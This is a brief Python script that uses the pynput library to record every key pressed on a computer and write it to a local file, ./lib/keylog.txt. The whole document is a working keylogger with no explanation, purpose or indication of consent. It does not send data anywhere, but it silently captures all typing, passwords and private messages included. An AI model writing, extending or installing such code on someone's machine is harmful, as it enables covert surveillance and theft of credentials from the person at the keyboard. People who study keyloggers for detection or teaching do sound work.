
from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=("./lib/keylog.txt"), level=logging.INFO, format='%(message)s')

def on_press(key):
    logging.info(key)

with Listener(on_press = on_press) as listener:
    listener.join()
